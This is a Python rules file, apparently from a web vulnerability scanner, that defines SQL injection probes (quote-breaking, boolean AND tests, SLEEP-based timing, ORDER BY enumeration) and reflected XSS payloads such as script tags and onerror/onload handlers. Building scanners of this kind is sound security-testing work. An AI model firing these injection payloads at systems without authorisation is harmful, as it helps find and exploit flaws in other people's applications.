from __future__ import annotations

_DELAY_SECONDS = 5
_MAX_ORDER_BY = 10

RULES: list[dict] = [
    {
        "attack_id": "AR-SQLI-ERROR",
        "vuln_type": "sqli",
        "technique": "error",
        "sequence": ["baseline", "error_attack"],
        "payload_templates": {
            "error_attack": [
                "{value}'",
                '{value}"',
                "{value}'-- ",
                '{value}"-- ',
                "{value}')",
            ],
        },
    },
    {
        "attack_id": "AR-SQLI-BOOLEAN",
        "vuln_type": "sqli",
        "technique": "boolean",
        "sequence": ["baseline", "true_attack", "false_attack"],
        "payload_templates": {
            "true_attack": [
                "{value}' AND '1'='1",
                '{value}" AND "1"="1',
                "{value} AND 1=1",
            ],
            "false_attack": [
                "{value}' AND '1'='2",
                '{value}" AND "1"="2',
                "{value} AND 1=2",
            ],
        },
    },
    {
        "attack_id": "AR-SQLI-TIME",
        "vuln_type": "sqli",
        "technique": "time",
        "sequence": ["baseline", "time_attack"],
        "payload_templates": {
            "time_attack": [
                f"{{value}}' AND SLEEP({_DELAY_SECONDS})-- ",
                f'{{value}}" AND SLEEP({_DELAY_SECONDS})-- ',
                f"{{value}} AND SLEEP({_DELAY_SECONDS})",
            ],
        },
    },
    {
        "attack_id": "AR-SQLI-ORDERBY",
        "vuln_type": "sqli",
        "technique": "order_by",
        "sequence": ["baseline", "orderby_attack"],
        "payload_templates": {
            # ORDER BY 1..N을 따옴표 없음/작은따옴표/큰따옴표 세 형태로 전개
            "orderby_attack": [
                tmpl.format(n=n)
                for n in range(1, _MAX_ORDER_BY + 1)
                for tmpl in ("{{value}}' ORDER BY {n}-- ", '{{value}}" ORDER BY {n}-- ', "{{value}} ORDER BY {n}")
            ],
        },
    },
    {
        "attack_id": "AR-XSS-REFLECTED",
        "vuln_type": "xss",
        "technique": "reflected",
        "sequence": ["baseline", "reflected_attack"],
        "payload_templates": {
            # {token}은 variant._expand_payloads가 아직 빈 문자열로 고정 치환함,
            # 요청별 고유 마커 필요해지면 그때 토큰 발급 로직 연결
            "reflected_attack": [
                "<script>alert('{token}')</script>",
                '"><img src=x onerror=alert(\'{token}\')>',
                "'><svg onload=alert(\"{token}\")>",
                '" onmouseover=alert(\'{token}\') x="',
                "</textarea><script>alert('{token}')</script>",
                "</script><script>alert('{token}')</script>",
            ],
        },
    },
]